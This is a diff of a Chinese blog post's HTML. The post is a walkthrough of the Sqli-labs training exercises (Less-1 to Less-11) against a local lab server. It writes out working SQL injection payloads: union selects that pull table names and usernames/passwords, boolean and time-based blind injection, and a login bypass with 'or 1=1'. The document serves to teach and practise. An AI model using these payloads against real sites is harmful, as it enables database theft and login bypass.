@@ -9,18 +9,18 @@
   
   <title>Sqli-lab 1-65关放弃指北 | Crustsalt&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Sqli-lab 1-65关放弃指北从大一我就说要写完 Sqli-lab ，然而至今好像也才写到20关。不如把 Sqli-lab 写完吧。（可能是有生之年？）先附上别人的writeup： https://www.cnblogs.com/-qing-/p/11610385.html 。 先大体说一下Sqli-lab，这是一个锻炼sql注入能力，是一个印度程序员开发的，一共有65关，刷完了Sqli-l">
+  <meta name="description" content="Sqli-lab 1-65关放弃指北Sqli-lab通关writeup，寒假觉得自己太堕落了，对sql注入也仅仅只掌握了最基本的原理，所以决定把sqli刷一遍。并且为了方便注入，我在sql语句后加入了  echo $sql;  这样可以方便学习。并且由于关卡数量比较庞大，每个关卡爆到表名就算完成任务（反正刷src也不能脱裤对吧）">
 <meta name="keywords" content="sql注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Sqli-lab 1-65关放弃指北">
 <meta property="og:url" content="/2019/11/02/Sqli/index.html">
 <meta property="og:site_name" content="Crustsalt&#39;s Blog">
-<meta property="og:description" content="Sqli-lab 1-65关放弃指北从大一我就说要写完 Sqli-lab ，然而至今好像也才写到20关。不如把 Sqli-lab 写完吧。（可能是有生之年？）先附上别人的writeup： https://www.cnblogs.com/-qing-/p/11610385.html 。 先大体说一下Sqli-lab，这是一个锻炼sql注入能力，是一个印度程序员开发的，一共有65关，刷完了Sqli-l">
+<meta property="og:description" content="Sqli-lab 1-65关放弃指北Sqli-lab通关writeup，寒假觉得自己太堕落了，对sql注入也仅仅只掌握了最基本的原理，所以决定把sqli刷一遍。并且为了方便注入，我在sql语句后加入了  echo $sql;  这样可以方便学习。并且由于关卡数量比较庞大，每个关卡爆到表名就算完成任务（反正刷src也不能脱裤对吧）">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-11-02T15:31:39.488Z">
+<meta property="og:updated_time" content="2019-11-07T03:52:16.783Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sqli-lab 1-65关放弃指北">
-<meta name="twitter:description" content="Sqli-lab 1-65关放弃指北从大一我就说要写完 Sqli-lab ，然而至今好像也才写到20关。不如把 Sqli-lab 写完吧。（可能是有生之年？）先附上别人的writeup： https://www.cnblogs.com/-qing-/p/11610385.html 。 先大体说一下Sqli-lab，这是一个锻炼sql注入能力，是一个印度程序员开发的，一共有65关，刷完了Sqli-l">
+<meta name="twitter:description" content="Sqli-lab 1-65关放弃指北Sqli-lab通关writeup，寒假觉得自己太堕落了，对sql注入也仅仅只掌握了最基本的原理，所以决定把sqli刷一遍。并且为了方便注入，我在sql语句后加入了  echo $sql;  这样可以方便学习。并且由于关卡数量比较庞大，每个关卡爆到表名就算完成任务（反正刷src也不能脱裤对吧）">
   
     <link rel="alternative" href="/atom.xml" title="Crustsalt&#39;s Blog" type="application/atom+xml">
   
@@ -185,7 +185,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/Java学习/" style="font-size: 10px;">Java学习</a> <a href="/tags/Windows-API编程/" style="font-size: 10px;">Windows API编程</a> <a href="/tags/sql注入/" style="font-size: 20px;">sql注入</a> <a href="/tags/两数之和/" style="font-size: 10px;">两数之和</a> <a href="/tags/套接字学习/" style="font-size: 10px;">套接字学习</a> <a href="/tags/整数反转/" style="font-size: 10px;">整数反转</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/非递减数列/" style="font-size: 10px;">非递减数列</a>
+                        <a href="/tags/Java学习/" style="font-size: 10px;">Java学习</a> <a href="/tags/Windows-API编程/" style="font-size: 10px;">Windows API编程</a> <a href="/tags/sql注入/" style="font-size: 20px;">sql注入</a> <a href="/tags/两数之和/" style="font-size: 10px;">两数之和</a> <a href="/tags/套接字学习/" style="font-size: 10px;">套接字学习</a> <a href="/tags/整数反转/" style="font-size: 10px;">整数反转</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/非递减数列/" style="font-size: 10px;">非递减数列</a>
                     </div>
                 </section>
                 
@@ -290,26 +290,121 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="Sqli-lab-1-65关放弃指北"><a href="#Sqli-lab-1-65关放弃指北" class="headerlink" title="Sqli-lab 1-65关放弃指北"></a><strong>Sqli-lab</strong> 1-65关放弃指北</h2><p>从大一我就说要写完 Sqli-lab ，然而至今好像也才写到20关。不如把 Sqli-lab 写完吧。（可能是有生之年？）先附上别人的writeup： <a href="https://www.cnblogs.com/-qing-/p/11610385.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/11610385.html</a> 。</p>
-<p>先大体说一下Sqli-lab，这是一个锻炼sql注入能力，是一个印度程序员开发的，一共有65关，刷完了Sqli-lab就基本上有了应对绝大多数场景的手工注入能力，某种意义上说这是sql注入的基础。而该项目的注入点就在于id参数（这个项目是真的能把id参数玩出花来）。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/index.php?id=1</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<hr>
+        <h2 id="Sqli-lab-1-65关放弃指北"><a href="#Sqli-lab-1-65关放弃指北" class="headerlink" title="Sqli-lab 1-65关放弃指北"></a><strong>Sqli-lab</strong> 1-65关放弃指北</h2><p>Sqli-lab通关writeup，寒假觉得自己太堕落了，对sql注入也仅仅只掌握了最基本的原理，所以决定把sqli刷一遍。<br>并且为了方便注入，我在sql语句后加入了</p>
 <blockquote>
-<p>Less1-Less10</p>
+<p>echo $sql;</p>
 </blockquote>
-<p>Less1</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">首先用以下两条语句发现存在sql注入（废话），因为它们的回显不同。</span><br><span class="line">id=1&apos; and 1=1 --+</span><br><span class="line">id=1&apos; and 1=2 --+</span><br><span class="line">order列一下字段数，原理同上，如果order猜出的字段数正确则类似and 1=1.不正确则如and 1=2。</span><br><span class="line">id=1&apos; order by 3--+</span><br><span class="line">发现有三个字段，用最简单的方法看一下显示位。这里要用-1，因为一个显示位只会显示返回的一条数据，如果id=1，则id=1的数据会把union所查询的数据覆盖。</span><br><span class="line">id=-1&apos; union select 1,2,3--+</span><br><span class="line">发现有显示位2和3。看一下数据库版本和有哪些数据库</span><br><span class="line">id=-1&apos; union select 1,version(),3--+</span><br><span class="line">id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata--+ </span><br><span class="line">去看一下表名</span><br><span class="line">id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br><span class="line">随便挑一个表，比如user</span><br><span class="line">id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;user&apos;--+</span><br><span class="line">就能看字段名了</span><br><span class="line">id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;user&apos;--+</span><br><span class="line">看一下具体的值即可</span><br><span class="line">id=-1&apos; union select 1,group_concat(username),group_concat(password) from users--+</span><br><span class="line">我可能只有第一关会每个步骤都写一遍，后面可能就是挑不太一样的步骤写</span><br></pre></td></tr></table></figure>
-<p>Less2</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">稍微随便试了以下，上一关id是字符型，这一关是数字型，其余一样</span><br><span class="line">id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
-<p>Less3</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id变成(&apos;id&apos;)类型，其余一样</span><br><span class="line">id=-1&apos;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
-<p>Less4</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id变成(&quot;id&quot;)类型，其余一样</span><br><span class="line">id=-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
-<p>Less5</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">稍微看了一下，盲注，布尔和时间都可以。说白了就是把上面的语句稍微改一下而已。id的类型是字符型。</span><br></pre></td></tr></table></figure>
-<hr>
-<p>未完待续</p>
+<p>这样可以方便学习。并且由于关卡数量比较庞大，每个关卡爆到表名就算完成任务（反正刷src也不能脱裤对吧）<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/index.php?id=1</span><br></pre></td></tr></table></figure></p>
+<p>以上语句是SQli的基本语句，是以id为参数注入的，先写在前面。</p>
+<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>一进去，先是一个显示login name和password的页面。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:Dumb</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:Dumb</span></span><br></pre></td></tr></table></figure>
+<p>我们给id加一个单引号看看<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure></p>
+<p>报错，报错提示</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/index.php?id=1'--+</span></span><br></pre></td></tr></table></figure>
+<p>加上注释符后，不报错，说明应该是字符型注入。</p>
+<p>由于正常渗透测试的时候，是无法看到sql语句的（根本没有报错信息好吗），所以我们加入的echo仅供参考，具体分析从报错信息分析。</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-<span class="literal">master</span>/Less-<span class="number">1</span>/index.php?<span class="attr">id=</span><span class="number">1</span>'<span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
+<p>有三个字段，查一下表名看看（已经判断过2，3为显示位）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>结果为</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:emails</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:3</span></span><br></pre></td></tr></table></figure>
+<p>这样一个个查询效率可能有点低，可以把两个显示位均利用起来。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>结果为</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:emails</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:referers</span></span><br></pre></td></tr></table></figure>
+<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">2</span><span class="regexp">/index.php?id=1--+</span></span><br></pre></td></tr></table></figure>
+<p>正常，说明是正常的数字型注入，同Less-1，注入表名。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/<span class="keyword">index</span>.php?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>--+</span><br></pre></td></tr></table></figure>
+<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">3</span><span class="regexp">/index.php?id=1')--+</span></span><br></pre></td></tr></table></figure>
+<p>是基于’)的注入，注入出表名。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/index.php?id=-1') union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">4</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">4</span><span class="regexp">/index.php?id=1'--+</span></span><br></pre></td></tr></table></figure>
+<p>以上两条语句均不报错，那么我们试试”</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">4</span><span class="regexp">/index.php?id=1"</span></span><br></pre></td></tr></table></figure>
+<p>报错信息是</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>所以我们可以猜测，是基于”)的注入。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-4/index.php?id=-1") union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>即可注入出表名。<br>但是我觉得我想不明白<br>注入语句是：</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;</span><br><span class="line"><span class="keyword">SELECT</span> * FROM users <span class="keyword">WHERE</span> id=($id) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>当id=1’–+时，sql语句为</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;          #id=<span class="string">"1'--+"</span></span><br><span class="line"><span class="keyword">SELECT</span> * FROM users <span class="keyword">WHERE</span> id=(<span class="string">"1'--+"</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>即为</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE id=(<span class="string">"1'</span></span><br></pre></td></tr></table></figure>
+<p>这为什么不报错</p>
+<p>最后实验发现，由于$id = ‘“‘ . $id . ‘“‘;  注释符在双引号内，导致注释符被看作字符串的一部分而非特殊符号。。。</p>
+<p>前面的字符型注入没有出现这个问题是因为字符型注入的sql语句是这么写的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
+<p>本题多了一个<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">id = <span class="string">'"'</span> . <span class="variable">$id</span> . <span class="string">'"'</span>;</span></span><br></pre></td></tr></table></figure></p>
+<p>相当于把id里的内容str化，所以特殊符号都失效了。输入双引号报错原因是id=”1””字符串双引号不匹配，所以会报错</p>
+<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>一进去，就是一个大大的</p>
+<blockquote>
+<p>You are in………..</p>
+</blockquote>
+<p>让我不禁想起了布尔盲注，不如试试看喽。</p>
+<p>先加一个’</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">5</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure>
+<p>报错</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">5</span><span class="regexp">/index.php?id=1'--+</span></span><br></pre></td></tr></table></figure>
+<p>熟悉的You are in………..又回来了，也就是说这是一个字符型注入，先判断一下数据库的长度</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">5</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> length(database())=<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>发现正确的You are in………..，也就是说数据库长度是8，那咱们看看数据库名字的首字母是什么<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">5</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
+<p>有回显，也就是说首字母的ascii是115，也就是s（以此类推<br>）//我就不爆表名了啊，咕咕咕</p>
+<h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1"--+</span></span><br></pre></td></tr></table></figure>
+<p>加双引号报错，再加注释符恢复正常，于是与Less-5其实一样的<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1" and length(database())=8--+</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1" and ascii(substr(database(),1,1))=115--+</span></span><br></pre></td></tr></table></figure>
+<h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">7</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure>
+<p>报错信息被关掉了，注释符也被过滤，但是加单引号报错，我们也就是说不出意外是字符型注入<br>尝试<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/127.0.0.1/sqli</span>-labs-master/Less-<span class="number">7</span>/index.php?id=<span class="number">1</span><span class="string">' and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>最后剩下的单引号去补全语句<br>所以我们可以尝试一下布尔盲注</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">7</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> length(database())=<span class="number">8</span> <span class="keyword">and</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>发现正确，也就是说数据库名字长度是8，接下来同Less-5</p>
+<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">8</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> length(database())=<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>正常显示you are in，报错无回显</p>
+<p>当=8不报错，=9报错，感觉和之前的盲注没有任何区别<br>于是 同上</p>
+<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>延时注入，这次无论出不出错回显都是一样的，不能用布尔盲注的方法，尝试使用延时注入</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> sleep(<span class="number">5</span>) <span class="keyword">and</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>发现成功延时，我们就可以用延时注入了，试试看数据库的长度</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>即如果数据库长度是8，则延时5s，否则什么都不干。延时注入耗时长，并且稳定性不高，因为无法判断是网络卡还是真的延时，如果把延时时间设的较高，可以排除网络卡顿的因素，但是耗时长，导致效率较低。</p>
+<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>同第十个，延时注入，把单引号换成双引号即可。<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?<span class="attr">id=1"</span> <span class="literal">and</span> sleep(<span class="number">5</span>) <span class="literal">and</span> <span class="string">"1"</span>=<span class="string">"1</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?<span class="attr">id=1"</span> <span class="literal">and</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="literal">and</span> <span class="string">"1"</span>=<span class="string">"1</span></span><br></pre></td></tr></table></figure>
+<h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>一进去是一个登录框(我猜是post注入)</p>
+<p>那就试试吧。<br>输入一下</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line">password:<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+<p>然后回显</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:Dumb</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:Dumb</span></span><br></pre></td></tr></table></figure>
+<p>这个是默认的用户名和密码，在实际的渗透测试中就等于是管理员用户的账号密码。那么这里存在post注入，post注入需要借助抓包工具。让我们打开可爱的bp。<br>发现post上去的数据包长这个样子</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;submit</span>=Submit</span><br></pre></td></tr></table></figure>
